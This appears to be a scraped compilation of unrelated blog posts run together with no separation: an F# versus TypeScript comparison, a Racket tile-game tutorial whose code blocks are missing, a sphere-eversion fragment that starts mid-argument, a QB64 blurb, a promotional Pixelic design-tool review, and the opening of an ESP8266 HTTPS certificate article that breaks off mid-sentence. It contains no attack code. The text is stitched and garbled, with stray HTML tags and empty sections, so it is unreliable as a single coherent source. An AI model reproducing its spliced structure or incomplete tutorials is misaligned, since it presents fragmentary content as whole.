    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
<p>Code written in F# for me more often than not is concise, easy to write, and even more comfortable to read, containing only very few noisy elements. I sometimes sit in front of my computer and just look at F# code, enjoying its beauty. Seriously, that's probably what sets it apart from most other languages I've had the chance to work with. And it brings literally back the joy in programming to me. That's a factor that cannot be stressed enough, in my opinion. I firmly believe that many bored or almost burned out, but very seasoned developers could quickly be sold on it and "flipped."</p>
<p>Whereas TypeScript certainly has different qualities. I like how it integrates with the JavaScript world, offering its type system's help where wanted. But allowing at the same time developers to keep writing their code in the JS style they are used to. It seems to walk the line perfectly fine between the strengths of a statically-typed language and some flexibility and freedom, e.g., through supporting duck-typing. So while I personally am not a big fan of curly braces and semicolons anymore, TypeScript surely provides an enjoyable developer experience as well.</p>
<h3>Vendor Support</h3>
<p>TypeScript receives a lot of attention, not only from Microsoft but industry-wide. I don't see a sign that its development might slow down in the foreseeable future.</p>
<p>Similarily, F# has always been supported by Microsoft since its inception, and a (small) team is actively working on it. So there is no reason to worry about the future of the language itself.</p>
<p>However, while TypeScript is the whole package of compiler plus language, F#'s web story is a bit different. It relies on Fable as the F# to JavaScript compiler. And Fable is a complex operation which, right now, depends on only a few people's willingness to continue to work on it in their spare time (also see "bus factor" below).</p>
<h3>Tooling</h3>
<p>The tooling support for TypeScript is just great. For example, it integrates well in Visual Studio Code and is supported by many other editors and IDEs. Several of them are commercially supported.</p>
<p>The same is actually true for F#. Visual Studio (on Windows and macOS), <a href="https://www.jetbrains.com/rider/">Jetbrains Rider</a> (on Windows, macOS, and Linux) and <a href="https://ionide.io/">Ionide</a> (on all three platforms as well) support it.</p>
<h3>Ecosystem</h3>
<p>For TypeScript, a large amount of JavaScript packages are supported by the community. At the time of writing, there are 6,892 packages supported alone through the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped</a> project.</p>
<p>Whereas the situation for Fable and F# is not that bright at the moment. There is support for a few essential players, e.g., React and Electron. But if you want to use a small random library, you most likely have to create (and maintain!) those bindings by yourself. Which is not a really complicated task â€“ but one that steals time, which could otherwise be spent working on your own project. And if some of the maintainers of the existing bindings lose interest in them, there is a big chance you will inherit them sooner or later (again, see bus factor).</p>
<h3>Bus Factor</h3>
<p>The sheer number of stakeholders makes TypeScript a safe bet for most things, e.g., tooling or library support. It's not only backed and actively developed by Microsoft, but also used by major web frameworks like Angular (Google) and Vue, or at least officially supported (React, Facebook). But it's not only the impressive number of large players. The community also consists of a large number of individual contributors.</p>
<p>Fable, on the other hand, has a small but active community of contributors and a few companies that are backing it (e.g., through <a href="https://safe-stack.github.io/">SAFE Stack</a>). However, the key drivers of the whole ecosystem are only a dozen or so people who move the entire platform forward in their spare time.</p>
<p>I personally see the chance of reaching the tipping point where the ecosystem might be able to grow faster â€“ but that's totally subjective and possibly more wishful thinking than reality.</p>
<h3>The Pit Of Success</h3>
<p>As <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">described by Jeff Atwood</a>:</p>
<blockquote>
<p>The Pit of Success: in stark contrast to a summit, a peak, or a journey across a desert to find victory through many trials and surprises, we want our customers to simply fall into winning practices by using our platform and frameworks. To the extent that we make it easy to get into trouble we fail.</p>
</blockquote>
<p>While TypeScript is a tool that integrates smoothly in the JS ecosystem, F# and Fable run on top of it. When using Elmish, JS is the eventual compilation target, and React is the execution layer on which the actual F# application is running without many external dependencies. Given this and the high robustness of the F# compiler plus the reliable guidance by the MVU architecture, it makes Fable and F# a poster child of the idea of the pit of success.</p>
<p>Whereas with TypeScript, every component might look different, depending on its author's taste and level of experience.</p>
<h3>Talent Pool</h3>
<p>There is no doubt that TypeScript is one of the <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved programming languages</a> on earth at the time of writing. So it should not be complicated to find TypeScript developers or train any developer on using it.</p>
<p>While not at all being that popular, I think the story for F# might be more rewarding. There is a large pool of .NET developers who mainly use C# today. A language that adopted and continues to borrow more and more features from F# and that is getting more and more bloated on the way. As already mentioned: I believe that many talented and seasoned C# developers can be trained to use F#. This will make programming more enjoyable to them again and allow you to leverage their experience on the .NET platform.</p>
<h2>Conclusion</h2>
<p>As you can see, there are valid arguments for both TypeScript and F#. While I can and will not pick a winner at this point, I hope some information in this post can help you to make an informed decision yourself. I am sure it will be the right one! ;-)</p>

<p>… in which we attempt to recreate a game from the nineties using the <a href="https://alex-hhh.github.io/2020/06/www.racket-lang.org">Racket</a> graphical facilities and we manage to do it in less than 1000 lines of code.</p>

<h2 id="the-game-play">The Game Play</h2>

<p>Instead of explaining the game, it is easier to show the game play. In the video below, the valid tiles are marked with their score, but this would be considered cheating in the actual game. The objective here, however, is to program the game, not to play it.</p>

<p>By the way, if you are in a hurry, you can go directly to the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">the source code</a> for the game.</p>

<hr>

<p>
 <iframe width="700" height="422" src="https://www.youtube.com/embed/UKMgURA5Wg8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></p>

<hr>

<p>The game is played on a 8x12 board with 72 tiles. There are six colors and six images which combined produce 36 unique tiles. Two of each tile are combined to make the playing set. The objective of the game is to place all the tiles on the board with the following rules:</p>

<ul>
 <li>
  <p>a tile must be placed next to one or more tiles</p></li>
 <li>
  <p>a tile can be placed next to another one if either their color or image  match. If there are multiple tiles around the tile, each neighbor must  match either the color or the image.</p></li></ul>

<p>The game starts with the first six tiles already on the board, one in each corner and two in the middle. The tiles are selected such that each possible color and each possible image is present on the board, thus ensuring that the very first tile can be placed on the board.</p>

<p>Scoring is done to reflect the complexity of the placement, with 1 point awarded if a tile is placed next to a single tile, 2 points for placing it against two tiles, 4 points for placing it against 3 neighbors and 8 points for placing it against 4.</p>

<p>The game ends when either there are no more tiles to be placed on the board or there is no valid location on which to place a tile.</p>

<h2 id="the-libraries">The Libraries</h2>

<p>Given that this is an interactive game where the user needs to drag tiles on a board, the easiest way to implement this game is to use <a href="https://docs.racket-lang.org/gui/Snip_and_Style_Classes.html">snips</a> and a <a href="https://docs.racket-lang.org/gui/editor-overview.html">pasteboard</a>. The <code>pasteboard%</code> is one of the two editors provided by the Racket GUI framework and it will handle most of drag and drop functionality which the game requires. To use it, we will need to provide two classes:</p>

<ul>
 <li>
  <p>a <code>snip%</code> class which represents a tile. A snip is an object which knows  its size and how to draw itself. You can do cool things with snips, such as  <a href="https://alex-hhh.github.io/2019/09/map-snip.html">rendering maps</a> and even basic <a href="https://alex-hhh.github.io/2019/09/interactive-heat-maps.html#embedded-snip-controls">GUI  controls</a>.</p></li>
 <li>
  <p>a <code>pasteboard%</code> class which manages the snips (it can also draw things of  its own). While we can use the <code>pasteboard%</code> directly for testing purposes,  we will need to define our own class to implement the restrictions imposed  by the game.</p></li></ul>

<p>The game will also use the <a href="https://docs.racket-lang.org/draw/index.html">racket/draw</a> facilities for drawing directly to a device context. The draw functions provided by <code>snip%</code> and <code>pasteboard%</code> already use <code>dc&lt;%&gt;</code> objects, and while we could have used the <code>pict</code> library for rendering, for this simple case, it was thought unnecessary.</p>

<h2 id="the-assets">The Assets</h2>

<p>While the game board can be drawn using just lines, the game tiles will need six colors and six images, and it would help if these images would be nice ones, rather than using simply a circle, square and triangle shapes. The Unicode character set has lots of <a href="http://unicode.org/emoji/charts/full-emoji-list.html">emoji characters</a> to choose from, and these are directly supported by Racket, which means that they can be stored in strings.</p>

<p>In the game code, I choose to represent the unicode characters using the <code>\U</code> escape sequence followed by a code point, and during development using <code>display</code> or the <code>text</code> pict constructor to see the actual glyphs in the DrRacket REPL:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/glyphs.png" alt=""></p></div>

<p>Choosing six colors can also be a difficult task if we want colors which look nice, are visually distinct and are also distinct for color-blind people. I don’t know how to chose colors which meet all this criteria, so my preferred way is to find color schemes defined by others, in this case, one of <a href="https://personal.sron.nl/~pault/">Paul Tol’s Color Schemes</a>, the “bright qualitative” one:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/colors.png" alt=""></p></div>

<h2 id="the-theme">The Theme</h2>

<p>Rather than storing the drawing assets (color and glyph) in each tile object, a helper class can be used to manage the common functionality and assets for all snips. A theme class also allows changing the “theme”, that is the colors and images at runtime — this is not implemented in this game, but could be added easily. Even without the ability to change themes, moving some common functionality in a separate class keeps the tile class simpler.</p>

<p>In addition to managing the graphics assets for drawing, the theme class also provides the size of each tile (the <code>cell-width</code> and <code>cell-height</code> fields). These are calculated by the board itself when it is resized and communicated to the theme and from here used by all tiles in the game:</p>



<h2 id="the-tiles">The Tiles</h2>

<p>The tiles represent the objects that can be moved on the board and they are implemented using snips. Two things are needed to create a new snip: define a snip class (not to be confused with a racket <code>class%</code>) and create a class derived from <code>snip%</code> overriding the <code>get-extent</code> and <code>draw</code> methods.</p>

<p>The snip class is used for serializing and de-serializing snip objects, but even though we don’t use this functionality in the game, we still need to define one. The definition is identical for any snip class, except they need to have unique names. Note that the snip class is actually an instance of <code>snip-class%</code> and not a class in itself:</p>

</pre></div>
</td></tr></tbody></table>
</div>

<p>We define our own <code>tile%</code> class derived from the <code>snip%</code> class. As far as the pasteboard is concerned, the new object needs to: (1) set the snip class for each instance (see the <code>set-snipclass</code> call below, (2) define a <code>get-extent</code> method which the pasteboard can use to determine the size of the snip and (3) define a draw method which is used to draw the snip.</p>

<p>In addition to the snip interface, also has a <strong>key</strong> a <strong>theme</strong> and a <strong>location</strong>. The <strong>key</strong> is a structure which contains the color and glyph codes for the tile and the <strong>theme</strong> is an object which holds the colors and glyphs used by the game (the tile class will ask the theme for the actual color to use corresponding to its key). The key and the theme are used for drawing the snip. Finally, the <strong>location</strong> is a structure which holds the location of the tile on the board (column and row). It is not used by the tile class at all, but it the pasteboard will need to know the location of each tile, so might as well store it inside the tile object you can find the full definition in the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">game source code</a>.</p>



<p>With the tile snip defined, we can write a quick test program to see how it works. Here we will use just a plain <code>pasteboard%</code> which will display the snip and allow moving them around with the mouse. There are several objects which make up the “game”:</p>

<ul>
 <li>the <code>bq-colors</code>, and <code>bird-glyphs</code> define the colors and images to use for  the tiles and they are managed by the <code>theme</code> object</li>
 <li>the <code>board</code> is simply the <code>pasteboard%</code> instance we’ll use</li>
 <li><code>toplevel</code> is the toplevel GUI window for the application, an instance of  the <code>frame%</code> class</li>
 <li><code>canvas</code> is the <code>editor-canvas%</code> which acts as the view for the  <code>pasteboard%</code> (the pasteboard itself only manages snips, displaying is  handled by one or more <code>editor-canvas%</code> instances)</li></ul>

<p>The code also creates six tiles, one for each color and image and inserts them into the pasteboard.</p>

<p>The result is an interactive application, which allows dragging the snips around. The <code>pasteboard%</code> provides a lot of functionality out of the box, but it still needs to be further customized to restrict its functionality according to the rules of the game (for example, snips should only be placed in precise positions on a board):</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/pasteboard.gif" alt=""></p></div>

<h2 id="the-pouch">The Pouch</h2>

<p>Having defined the tiles, we need to produce 72 of them, preferably in random order, so it they can be used in the game. To generate all the possible tiles, we can use nested for loops over the all the possible colors and images:</p>



<p>The previous list is ordered by color and image, and we need to shuffle it:</p>



<p>Finally, and this is the tricky bit, the first six tiles need to have unique colors and images. This is because the first six tiles are already on the board when the game starts and to ensure that the user can always place the next tile, all the colors and images need to be on the board. To achieve this, we loop over the shuffled tiles and move the first six unique tiles to the front. Doing this ensures that, while the first tiles are unique, they also start in a random order for each game.</p>

    Circle eversion in two dimensions is impossible.

The figure above illustrates that there’s really nothing to do but introduce loops which we can’t then get rid of. Don’t take my word for it though! The classic video <a href="https://www.youtube.com/watch?v=wO61D9x6lNY">Outside In</a> has an much more involved discussion of what happens when we try.</p><p>Since the original proof, a number of realizations of sphere eversion have been discovered, ranging in generality and complexity. This post follows the method of Bednorz and Bednorz from <a href="https://arxiv.org/abs/1711.10466">Analytic sphere eversion using ruled surfaces</a>.</p><p>Before stepping through the eversion, we lay out our ground rules, of which there are just two: We may not cut the surface, and the surface must always remain smooth.  Note that unlike physical objects, self-intersection <em>is</em> permitted.</p><h2 id="bednorz’-sphere-eversion">Bednorz’ Sphere Eversion</h2><p>We start with a full presentation of the sphere eversion of Bednorz and Bednorz in <a href="https://arxiv.org/abs/1711.10466">Analytic sphere eversion using ruled surfaces</a>. It goes by quickly, so we’ll then break it down and try to understand it a bit better. Along the way, you can drag the slider at the top to examine cross-sections.</p><p>
Quality: </p></div><div><p>Success! But that all happened very quickly. What happens at the top is clearly the key. In some sense, we do simply push one end of the sphere right through the other, but we need some clever tricks to keep the hole at the top smooth.</p><p>Bednorz and Bednorz break down the method as follows. As long as nothing topologically interesting happens at the poles of the sphere, we can simply remove them from the equation and focus on a cylindrical band around the equator. All that’s left then is to manipulate the cylindrical band carefully and replace the poles at the end of the process.</p><p>The key element of their method is a family of <em><a href="https://mathworld.wolfram.com/RuledSurface.html">ruled surfaces</a></em>, or surfaces swept out by a straight line moving through space, which accomplish this task. They propose a family parameterized by time <span><span> <span><span><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span></span> </span></span>.

<h2>From the 80s to eternity</h2>



<p><strong>How BASIC made its way into the 21st century</strong></p>



<p>The BASIC language has been the gateway into programming for countless people. Popular as a beginner programming language in the 80’s and evolving into a powerful professional tool in 90’s, BASIC (and its successor QBasic), helped many people develop a love for programming. These languages provided the foundational learning platform for most of today’s professional developers.</p>



<p>The QB64 project has evolved over the last decade to bring the magic and educational potential of BASIC from its 20th century roots into the modern era. The QB64 project is already in use in both educational and professional contexts and has an active and helpful user community.</p>



<p>Unlike traditional BASIC and QBasic code, QB64 gets compiled automatically into machine code – allowing exceptional performance, easy distribution, and the ability to link with external C and C++ programming libaries. Compatible with most QBasic 4.5 code, QB64 adds a number of extensions, such as OpenGL and other modern features, providing the perfect blend of classic and modern program development.</p>



<p>QB64 is available for all recent Windows, Linux, and macOS versions.</p>

                    <p>A few weeks ago, our team adopted a tool called <a href="https://www.pixelic.io/">Pixelic</a>, a UX collaboration tool that integrates with Figma and Slack to make design feedback, task management, and documentation more accessible.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screenshot-2020-07-01-14.57.58.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screenshot-2020-07-01-14.57.58.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screenshot-2020-07-01-14.57.58.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screenshot-2020-07-01-14.57.58.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screenshot-2020-07-01-14.57.58.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Pixelic's Figma frames screen.</figcaption></figure><p>I observed our team go through multiple design iterations using the tool and thought it’d be helpful for other designers and teams to get a perspective on how Pixelic makes the UX design process much easier.</p><p>Here are three topics that I’ll be sharing:</p><ol><li>When do you use Pixelic? A use case for teams</li><li>Tracking history and product backlog through Pixelic</li><li>Creating a shared understanding via Pixelic and its efficacy</li></ol><h2 id="when-do-you-use-pixelic">When do you use Pixelic?</h2><figure><img src="https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/106546009_877858009376814_471483989897433073_n.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/106546009_877858009376814_471483989897433073_n.png 1000w, https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png 1566w" sizes="(min-width: 720px) 720px"><figcaption>This process chart describes our team’s current UX design process from ideation to retrospectives.</figcaption></figure><p>Rows colored in yellow (from rough sketch, discussion/UX policies, to design QA) were design phases where Pixelic made our collaboration easier.</p><h2 id="improvement-points">Improvement Points</h2><p>Pixelic launched its first open beta in May 2020, so there were areas for improvement and a few features still in development.</p><p>We needed a wiki-like feature where we could take notes, store UX specifications, and share them with product and engineering teams. Notion and Zeplin were our go-to-tools for this during the “Understanding” phase in our design process.</p><p>It was pretty difficult to switch from Notion/Zeplin right away, but we hope to see more improvements in Pixelic’s documentation features.</p><h2 id="where-pixelic-came-in-handy-for-our-team">Where Pixelic came in handy for our team</h2><p>We realized that Pixelic could be a source of truth for the communication log as it integrates with Figma and Slack. This came in handy during our Design QA phase.</p><p>Before Pixelic, we had to manually create QA documents in Notion and share it with our engineering and product partners. We would copy and paste several links, upload screenshots, write thorough descriptions on the acceptance criteria.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1600w, https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1942w" sizes="(min-width: 720px) 720px"><figcaption>Sample Notion screen. There was so much to fill out in Notion to make our design QA work.</figcaption></figure><p>With Pixelic, we’re now able to just import Figma frames into the tool and write acceptance criteria using Pixelic’s annotation feature. There’s no need for us to take screenshots, copy/paste Zeplin links, and communicate with our engineering partners to create QA tasks. Pixelic did them all automatically.</p><h3 id="1-tracking-design-task-backlog-history">1) Tracking design task backlog history</h3><p>Not having an optimal product development and design process often made our workflow less productive. It looked something like this:</p><ol><li>Designer “A” and Developer “B” review design and exchange feedback in Slack</li><li>They then add the outcome (often design tasks) of the meeting to a Jira project Kanban board under the backlog</li><li>Product manager “C” notices the new task, but doesn’t have any context as to why it was created. So “C” requests designers “A” &amp; “B” to explain.</li><li>Teammates “A” &amp; “B” stop what they were doing, and loop C in so “C” could understand the context</li></ol><p>If only we had a place where the product manager (“C”) can read/understand the context behind a task or decision without asking the designers “A” and “B,” they would have kept their focus on doing more important tasks. We became less productive as a team due to redundant meetings and discussion. (Meetings are seldom productive!)</p><p>We found that Pixelic was a perfect tool for this pain point. Here are a few ways Pixelic helped us:</p><h3 id="2-pixelic-automates-task-creation-process">2) Pixelic automates task creation process</h3><p>It’s pretty difficult to keeping track of action items during design reviews. Someone has to take charge of translating discussions into actionable tasks and adding them to a project board while others continue discussing.</p><p>But with Pixelic, all you need to do is click the “taskify” button on each comment. Even during meetings, you can convert comments into tasks while viewing the design, so there’s no “context-switching cost” incurred. Pixelic lets you convert comments into tasks without diverging from the discussion.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/taskify.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/taskify.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/taskify.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/taskify.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/06/taskify.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>"Taskify" button on each comment on Pixelic converts respective comments into tasks</figcaption></figure><p>Traditionally, teams switch between communication apps (e.g., Slack) and task management apps (e.g., Jira, Notion, etc.) to go back and forth, discussing and adding tasks. Pixelic converges them together so that you can instantly flip the switch to “taskify” a comment.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1000w, https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>Switching back and forth Slack and Notion to manage feedback and tasks at the same time is cumbersome.</figcaption></figure><p>Pixelic also has built-in version control for each Figma frame. With this feature, you can track all comments by each version.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="3-pixelic-tasks-connect-with-figma-frames-and-their-comments-2-ways-">3) Pixelic tasks connect with Figma frames and their comments “2-ways”</h3><p>Pixelic’s unique task management feature allows designers to access Figma frames directly from the tasks. This is different from what you see in Notion or Jira, Pixelic’s Figma integration imports actual Figma frames into the tool for you.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/task-comments.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/task-comments.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/task-comments.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/task-comments.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/task-comments.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Figma frame comments are always connected with tasks bi-directionally.</figcaption></figure><p>This has two key benefits: (1) anyone can understand the context behind the task without asking others, and (2) view relevant Figma frames, or user flows without logging into Figma.</p><p>Engineers and product managers can access relevant UIs connected to each task and quickly understand the task.</p><p>Adding links, screenshots, and descriptions to each task on Jira or Asana is cumbersome if you have to do them every time. In Pixelic, since Figma frames are connected to each task, there’s no need to copy/paste links or screenshots.</p><blockquote>“What if we allow our users to sign up directly from the <strong>home screen</strong>?”</blockquote><p>Let’s say your colleague suggested above during a product meeting. How many of your team would think of the same screen? Was it the landing page? Sign up page? Main application page?</p><p>Without a shared understanding of the product, it’s challenging to communicate, and often people would have to elaborate with more details.</p><p>It’s too hard for people to see the forest through the trees, so to speak. Without the interface, people will think of different representations of the product. It’s just not an effective way to collaborate.</p><blockquote>“This wasn’t what I thought of.”<br>– said every stakeholder 🙄</blockquote><p>Driving shared understanding is crucial to make your workflow productive. Too often, teams revert back to ideation because they failed to align on the same page.</p><p>From my experience working at various startups as a product designer, what worked was communicating visually.</p><p>Visual communication saves not only the presenter’s time but also the audience because they can see what you’re seeing. Experts say a human brain processes images 60,000 times faster than texts.</p><h3 id="pixelic-is-the-ultimate-visual-communication-software">Pixelic is the ultimate visual communication software</h3><figure><img src="https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1000w, https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>I took a screenshot of our team discussion on Pixelic (in Korean).</figcaption></figure><p>In offline meetings, you can point out where you are talking about with your fingertips, but in remote settings, it’s not that simple. And remote collaboration via video conferencing now became the norm since COVID-19.</p><p>Pixelic helped us see the visuals (interface) as well as comments next to them while video conferencing. In Pixelic, you can click &amp; drag specific areas of the image and comment on them. This helped us to store everything so we could always go back to them later.</p><h2 id="in-conclusion">In Conclusion</h2><p>Yes, adding a tool to your already tool stack isn’t the most exciting thing for your team. But if the new tool replaces or complements your current stack to enhance team productivity, it’s a no brainer to adopt it.</p><p>Pixelic was a no brainer for us. Through Pixelic, we were able to enhance our team productivity. It helped us build a clear, shared understanding of our product across the team. And managing design projects were super easy and convenient thanks to its seamless integration with Figma.</p><p>There are some features that Pixelic still needs to add to replace our entire design collaboration tool stack, but ever since we started using Pixelic, its founders moved fast to add new fixes and updates every week.</p><p>The founders have been super supportive of any questions or requests we had. We’re excited to partner with the Pixelic team to build an optimal tool for software teams.</p><hr><p><em>Jieun is a product designer based in Seoul, South Korea.

Doing so over HTTP is implemented quite well in the default ESP8266 Arduino libraries, but for HTTPS requests things are more difficult. In this post I will discuss the most common approaches used by the community, and develop my own method to do arbitrary HTTPS requests in a secure way. This method will not require any specific certificates or fingerprints to be manually coded in the application.</p><p>HTTPS if a method to do a HTTP request over a TLS (formerly SSL) connection. By doing so, the data that is sent back and forth between your computer and the server is encrypted and protected. The good news is that this protocol can be used with the ESP8266 with the <span>WiFiClientSecure</span> class. The bad news is that the common methods to do so have some big disadvantages.</p><p>First I will show the two most common approaches, and next I will describe a generic solution to their problems.</p><h3>A word about certificates</h3><p>Before diving into the details I will briefly explain the basic principles of secure HTTPS requests in layman's terms.</p><p>Basically, every website has a certificate. This certificate is issued by somebody, who is called a certification authority (CA). Each CA certificate can be issued by another CA which leads to the so called certificate chain. In the picture the chain is 3 certificates long, but in reality the length of the chain can be anything.</p><p>A certificate chain. Image from Wikipedia</p><p>The top level certificate is called a root certificate. This certificate is self-signed, which means that it can be trusted inherently. This is because only a few organisations can issue root certificates, and these are trusted to not offer fake or wrong certificates.</p><p>When you do a HTTPS request to a website from your browser, the browser will look at the certificate for the website, and validating if the certificate is indeed issued by its parent. This can be done because each certificate is signed with the private key of the upstream certificate. An explanation for dummies on public and private keys work can be found <a href="https://medium.com/@vrypan/explaining-public-key-cryptography-to-non-geeks-f0994b3c2d5" target="_blank" rel="noopener noreferrer">here<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>.</p><p>When it is verified that the certificate is indeed issued by a trusted root CA issuer, it is verified that the domain in the certicate is the same as the actual domain. If that is true, we know that the server is who it claims to be, and a secure connection can be started . </p><p>These trusted root certificates are actually stored as part of your browser to be able to validate all other certificates. Each OS or browser stores a slightly different set of roughly 100-200 root certificates, which it knows can be trusted. This is called a certificate store, and this is exactly what I will apply on the ESP8266 later in this article. But first, let's start with the two most popular other approaches.</p><h3>Fingerprints - secure but annoying</h3><p>The method that is proposed in the official ESP8266 Arduino <a href="https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/client-secure-examples.html" target="_blank" rel="noopener noreferrer">documentation<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" 